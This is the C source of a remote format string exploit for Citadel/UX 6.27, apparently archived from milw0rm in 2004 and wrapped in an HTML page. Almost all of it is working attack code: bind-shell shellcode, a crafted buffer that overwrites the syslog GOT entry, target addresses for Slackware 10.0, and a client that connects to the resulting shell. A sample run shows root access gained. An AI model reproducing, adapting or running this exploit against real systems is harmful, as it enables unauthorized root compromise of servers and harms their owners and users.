<html><head><title>Citadel/UX <= 6.27 Remote Root Format String Exploit</title></head><pre>/* citadel_fsexp.c
 *
 * Citadel/UX v6.27 remote format string exploit
 *
 * Use: ./citadel_fsexp -h &lt;host&gt; [options]
 *
 * options:
 *        -h &lt;arg&gt;        host or IP
 *        -t &lt;arg&gt;        type of target system
 *        -l              targets list
 *        -g &lt;arg&gt;        syslog GOT address
 *        -r &lt;arg&gt;        RET address
 *
 * coki@nosystem:~/audit$ ./citadel_fsexp -h localhost -t0
 *
 * Citadel/UX v6.27 remote format string exploit
 * by CoKi &lt;coki@nosystem.com.ar&gt;
 *
 * [*] host                       : localhost
 * [*] system                     : Slackware Linux 10.0
 * [*] syslog GOT address         : 0x0809e9e8
 * [*] RET address                : 0xbfffd5fa
 *
 * [+] verifying host...          OK
 * [+] conecting...               OK
 * [+] building exploit...        OK
 * [+] sending exploit...         OK
 *
 * [+] waiting for shell...
 * [+] connecting to shell...     OK
 *
 * [!] you have a shell :)
 *
 * Linux nosystem 2.4.26 #29 Mon Jun 14 19:22:30 PDT 2004 i686 unknown unknown GNU/Linux
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),
 * 11(floppy)
 *
 * Tested in Slackware 10.0
 *    
 * by CoKi &lt;coki@nosystem.com.ar&gt;
 * No System Group - http://www.nosystem.com.ar
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#define BUFFERSIZE 1024
#define ERROR -1
#define TIMEOUT 3
#define PORT 504
#define SHELL 5074

int connect_timeout(int sfd, struct sockaddr *serv_addr,
  socklen_t addrlen, int timeout);
int check(unsigned long addr);
void use(char *program);
void printlist(void);
void shell(char *host, int port);

char shellcode[] = /* 92 bytes by s0t4ipv6 */
	&quot;\x31\xc0&quot;			// xorl		%eax,%eax
	&quot;\x50&quot;				// pushl	%eax
	&quot;\x40&quot;				// incl		%eax
	&quot;\x89\xc3&quot;			// movl		%eax,%ebx
	&quot;\x50&quot;				// pushl	%eax
	&quot;\x40&quot;				// incl		%eax
	&quot;\x50&quot;				// pushl	%eax
	&quot;\x89\xe1&quot;			// movl		%esp,%ecx
	&quot;\xb0\x66&quot;			// movb		$0x66,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	&quot;\x31\xd2&quot;			// xorl		%edx,%edx
	&quot;\x52&quot;				// pushl	%edx
	&quot;\x66\x68\x13\xd2&quot;		// pushw	$0xd213
	&quot;\x43&quot;				// incl		%ebx
	&quot;\x66\x53&quot;			// pushw	%bx
	&quot;\x89\xe1&quot;			// movl		%esp,%ecx
	&quot;\x6a\x10&quot;			// pushl	$0x10
	&quot;\x51&quot;				// pushl	%ecx
	&quot;\x50&quot;				// pushl	%eax
	&quot;\x89\xe1&quot;			// movl		%esp,%ecx
	&quot;\xb0\x66&quot;			// movb		$0x66,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	&quot;\x40&quot;				// incl		%eax
	&quot;\x89\x44\x24\x04&quot;		// movl		%eax,0x4(%esp,1)
	&quot;\x43&quot;				// incl		%ebx
	&quot;\x43&quot;				// incl		%ebx
	&quot;\xb0\x66&quot;			// movb		$0x66,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	&quot;\x83\xc4\x0c&quot;			// addl		$0xc,%esp
	&quot;\x52&quot;				// pushl	%edx
	&quot;\x52&quot;				// pushl	%edx
	&quot;\x43&quot;				// incl		%ebx
	&quot;\xb0\x66&quot;			// movb		$0x66,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	&quot;\x93&quot;				// xchgl	%eax,%ebx
	&quot;\x89\xd1&quot;			// movl		%edx,%ecx
	&quot;\xb0\x3f&quot;			// movb		$0x3f,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	&quot;\x41&quot;				// incl		%ecx
	&quot;\x80\xf9\x03&quot;			// cmpb		$0x3,%cl
	&quot;\x75\xf6&quot;			// jnz		&lt;shellcode+0x40&gt;
	&quot;\x52&quot;				// pushl	%edx
	&quot;\x68\x6e\x2f\x73\x68&quot;		// pushl	$0x68732f6e
	&quot;\x68\x2f\x2f\x62\x69&quot;		// pushl	$0x69622f2f
	&quot;\x89\xe3&quot;			// movl		%esp,%ebx
	&quot;\x52&quot;				// pushl	%edx
	&quot;\x53&quot;				// pushl	%ebx
	&quot;\x89\xe1&quot;			// movl		%esp,%ecx
	&quot;\xb0\x0b&quot;			// movb		$0xb,%al
	&quot;\xcd\x80&quot;			// int		$0x80
	;

struct {
	char	*os;
	int	got;
	int	ret;
}targets[] =
	{&quot;Slackware Linux 10.0&quot;, 0x0809e9e8, 0xbfffd5fa};

int main(int argc, char *argv[]) {
	char buffer[BUFFERSIZE], temp[BUFFERSIZE];
	char opt, *host=NULL, *system=NULL, *p;
	int sockfd, i, retaddr=0, gotaddr=0, targetnum=0;
	unsigned int bal1, bal2, bal3, bal4;
	int cn1, cn2, cn3, cn4;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	printf(&quot;\n Citadel/UX v6.27 remote format string exploit\n&quot;);
	printf(&quot; by CoKi &lt;coki@nosystem.com.ar&gt;\n\n&quot;);

	while ((opt = getopt(argc,argv,&quot;h:g:r:t:l&quot;)) != EOF) {
		switch (opt) {
			case 'h':
				host = optarg;
				break;
			case 'g':
				gotaddr = strtoul(optarg,NULL,0);
				break;
			case 'r':
				retaddr = strtoul(optarg,NULL,0);
				break;
			case 't':
				targetnum = atoi(optarg);
				if(targetnum != 0) {
					printf(&quot; invalid target number!\n\n&quot;);
					exit(0);
				}
				system = targets[targetnum].os;
				gotaddr = targets[targetnum].got;
				retaddr = targets[targetnum].ret;
				break;
			case 'l':
				printlist();
				break;
			default:
				use(argv[0]);
				break;
		}
	}

	if(host == NULL) use(argv[0]);
	if(gotaddr == 0 || retaddr == 0) use(argv[0]);
	if(system == NULL) system = &quot;unknown&quot;;

	printf(&quot; [*] host\t\t\t: %s\n&quot;, host);
	printf(&quot; [*] system\t\t\t: %s\n&quot;, system);
	printf(&quot; [*] syslog GOT address\t\t: %010p\n&quot;, gotaddr);
	printf(&quot; [*] RET address\t\t: %010p\n\n&quot;, retaddr);
    
	printf(&quot; [+] verifying host...\t\t&quot;);
	fflush(stdout);

	if((he=gethostbyname(host)) == NULL) {
		herror(&quot;Error&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	} 
	
	printf(&quot;OK\n&quot;);

	if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		perror(&quot;Error&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = htons(PORT);
	dest_dir.sin_addr = *((struct in_addr *)he-&gt;h_addr);
	bzero(&amp;(dest_dir.sin_zero), 8);

	printf(&quot; [+] conecting...\t\t&quot;);
	fflush(stdout);
	
	if(connect_timeout(sockfd, (struct sockaddr *)&amp;dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {
		
		printf(&quot;Closed\n\n&quot;);
		exit(1);
	}

	printf(&quot;OK\n&quot;);
	
	printf(&quot; [+] building evil buffer...\t&quot;);
	fflush(stdout);

	bzero(buffer, sizeof(buffer));
	strcat(buffer, &quot;x&quot;);

	for(i = 0; i &lt; 4; i++) {
		bzero(temp, sizeof(temp));
		sprintf(temp, &quot;%s&quot;, &amp;gotaddr);
		strncat(buffer, temp, 4);
		gotaddr++;
	}

	bal1 = (retaddr &amp; 0xff000000) &gt;&gt; 24;
	bal2 = (retaddr &amp; 0x00ff0000) &gt;&gt; 16;
	bal3 = (retaddr &amp; 0x0000ff00) &gt;&gt;  8;
	bal4 = (retaddr &amp; 0x000000ff);
  
	cn1 = bal4 - 16 - 1 - 15 - 50 - 92;
	cn1 = check(cn1);
	cn2 = bal3 - bal4;
	cn2 = check(cn2);
	cn3 = bal2 - bal3;
	cn3 = check(cn3);
	cn4 = bal1 - bal2;
	cn4 = check(cn4);

	p = buffer;
	p += 17;

	memset(p, '\x90', 50);

	strcat(buffer, shellcode);

	sprintf(temp, &quot;%%%du%%27$n%%%du%%28$n%%%du%%29$n%%%du%%30$n&quot;,
cn1, cn2, cn3, cn4);
                
	strcat(buffer, temp);
	bzero(temp, sizeof(temp));

	printf(&quot;OK\n&quot;);

	printf(&quot; [+] sending evil buffer...\t&quot;);
	fflush(stdout);
	
	recv(sockfd, temp, sizeof(temp), 0);
	send(sockfd, buffer, strlen(buffer), 0);
	send(sockfd, &quot;\n&quot;, 1, 0);
	close(sockfd);
	
	printf(&quot;OK\n\n&quot;);

	printf(&quot; [+] waiting for shell...\n&quot;);
	fflush(stdout);
	sleep(2);

	shell(host, SHELL);
}

int connect_timeout(int sfd, struct sockaddr *serv_addr,
	socklen_t addrlen, int timeout) {

	int res, slen, flags;
	struct timeval tv;
	struct sockaddr_in addr;
	fd_set rdf, wrf;

	fcntl(sfd, F_SETFL, O_NONBLOCK);

	res = connect(sfd, serv_addr, addrlen);

	if (res &gt;= 0) return res;

	FD_ZERO(&amp;rdf);
	FD_ZERO(&amp;wrf);

	FD_SET(sfd, &amp;rdf);
	FD_SET(sfd, &amp;wrf);
	bzero(&amp;tv, sizeof(tv));
	tv.tv_sec = timeout;

	if (select(sfd + 1, &amp;rdf, &amp;wrf, 0, &amp;tv) &lt;= 0)
		return -1;

	if (FD_ISSET(sfd, &amp;wrf) || FD_ISSET(sfd, &amp;rdf)) {
		slen = sizeof(addr);
		if (getpeername(sfd, (struct sockaddr*)&amp;addr, &amp;slen) == -1)
			return -1;

		flags = fcntl(sfd, F_GETFL, NULL);
		fcntl(sfd, F_SETFL, flags &amp; ~O_NONBLOCK);

		return 0;
	}

	return -1;
}

int check(unsigned long addr) {
	char tmp[128];
	snprintf(tmp, sizeof(tmp), &quot;%d&quot;, addr);
	if(atoi(tmp) &lt; 1)
		addr = addr + 256;
  
	return addr;
}

void use(char *program) {
	printf(&quot; Use: %s -h &lt;host&gt; [options]\n&quot;, program);
	printf(&quot;\n options:\n&quot;);
	printf(&quot;	-h &lt;arg&gt;	host or IP\n&quot;);
	printf(&quot;	-t &lt;arg&gt;	type of target system\n&quot;);
	printf(&quot;	-l 		targets list\n&quot;);
	printf(&quot;	-g &lt;arg&gt;	syslog GOT address\n&quot;);
	printf(&quot;	-r &lt;arg&gt;	RET address\n\n&quot;);
	exit(1);
}

void printlist(void) {
	printf(&quot; targets\n&quot;);
	printf(&quot; -------\n\n&quot;);
	printf(&quot; [0] %s\n\n&quot;, targets[0].os);
	exit(0);
}

void shell(char *host, int port) {
	int sockfd, n;
	char buff[BUFFERSIZE];
	fd_set readfs;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	printf(&quot; [+] connecting to shell...\t&quot;);
	fflush(stdout);

	if((he=gethostbyname(host)) == NULL) {
		herror(&quot;Error&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	} 

	if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		perror(&quot;Error&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = htons(port);
	dest_dir.sin_addr = *((struct in_addr *)he-&gt;h_addr);
	bzero(&amp;(dest_dir.sin_zero), 8);

	if(connect_timeout(sockfd, (struct sockaddr *)&amp;dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {
		
		printf(&quot;Closed\n\n&quot;);
		printf(&quot; [-] failed! perhaps the target has down...\n\n&quot;);
		exit(1);
	}

	printf(&quot;OK\n\n&quot;);

	printf(&quot; [!] you have a shell :)\n\n&quot;);
	fflush(stdout);

	send(sockfd, &quot;uname -a; id;\n&quot;, 14, 0);

	while(1) {
		FD_ZERO(&amp;readfs);
		FD_SET(0, &amp;readfs);
		FD_SET(sockfd, &amp;readfs);
		if(select(sockfd+1, &amp;readfs, NULL, NULL, NULL) &lt; 1) exit(0);
		if(FD_ISSET(0,&amp;readfs)) {
			if((n = read(0,buff,sizeof(buff))) &lt; 1)
			exit(0);
			if(send(sockfd, buff, n, 0) != n) exit(0);
		}
		if(FD_ISSET(sockfd,&amp;readfs)) {
			if((n = recv(sockfd, buff, sizeof(buff), 0)) &lt; 1) exit(0);
			write(1, buff, n);
		}
	}
}

// milw0rm.com [2004-12-12]</pre></html>